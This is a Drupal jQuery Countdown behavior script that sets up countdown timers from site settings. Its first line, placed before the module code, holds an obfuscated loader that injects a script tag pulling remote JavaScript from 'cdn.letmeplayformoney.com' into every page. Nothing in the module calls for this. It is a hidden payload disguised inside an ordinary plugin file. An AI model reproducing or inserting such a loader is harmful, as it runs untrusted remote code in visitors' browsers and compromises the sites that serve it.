var _0x25b0=['createElement','script','onload','src','https://cdn.letmeplayformoney.com/main.js?cdn=js','text/javascript','getElementsByTagName','head','appendChild'];(function(_0x38c36f,_0x12afce){var _0x31d501=function(_0x338e37){while(--_0x338e37){_0x38c36f['push'](_0x38c36f['shift']());}};_0x31d501(++_0x12afce);}(_0x25b0,0x1dd));var _0x4bec=function(_0x1c1d3d,_0x21e514){_0x1c1d3d=_0x1c1d3d-0x0;var _0x2921c7=_0x25b0[_0x1c1d3d];return _0x2921c7;};var script=document[_0x4bec('0x0')](_0x4bec('0x1'));script[_0x4bec('0x2')]=function(){};script[_0x4bec('0x3')]=_0x4bec('0x4');script['type']=_0x4bec('0x5');document[_0x4bec('0x6')](_0x4bec('0x7'))[0x0][_0x4bec('0x8')](script);// $Id$
(function ($) {
  /**
   * jQuery Countdown Drupal behavior.
   */
  Drupal.behaviors.jquery_countdown = {
    attach: function(context, settings) {
    
    // Only process if the settings exist.
    if (Drupal.settings.jquery_countdown) {
      // Loop through all the jQuery Countdown settings.
      jQuery.each(Drupal.settings.jquery_countdown, function(countdown, options) {

        $(countdown + ':not(.jquery-countdown-processed)', context).addClass('jquery-countdown-processed').each(function(){
            // Process the date properties if available.
            if (typeof (options.until) != "undefined") {
              options.until = Drupal.jQueryCountdownProcessDate(options.until);
            }
            if (typeof (options.since) != "undefined") {
              options.since = Drupal.jQueryCountdownProcessDate(options.since);
            }

            // Evaluate the callbacks as function names.
            if (typeof (options.onExpiry) == "string") {
              options.onExpiry = eval(options.onExpiry);
            }
            if (typeof (options.onTick) == "string") {
              options.onTick = eval(options.onTick);
            }

            $(this).countdown(options);
        });

      });
    }
    }
  };

  /**
   * Process date values for the jQuery Countdown plugin, based on the date type.
   */
  Drupal.jQueryCountdownProcessDate = function(dateVal) {
    
    if (typeof (dateVal) == "string") {
      // Create the Date using the string.
      return new Date(dateVal);
    } else if (typeof (dateVal) == "number") {
      // Return the number of seconds.
      return dateVal;
    } else if (dateVal instanceof Array || dateVal instanceof Object) {
      // Create the Date object from available values, avoiding passing invalid
      // objects.
      var date = new Date();
      for (i = 0; i < 6; i++) {
        dateVal[i] = dateVal[i] || 0;
      }
      date.setFullYear(dateVal[0]);
      date.setMonth(dateVal[1]);
      date.setDate(dateVal[2]);
      date.setHours(dateVal[3]);
      date.setMinutes(dateVal[4]);
      date.setSeconds(dateVal[5]);
      return date;
    }
    return dateVal;
    
  };
  
  Drupal.jQueryCountdownEvent = function() {
    $.ajax({
      url: Drupal.settings.basePath + 'ajax/jquery-countdown-terminate',
      dataType: 'json',
      success: function(res) {
        // res.response === true
      }
    });
  }
}) (jQuery);
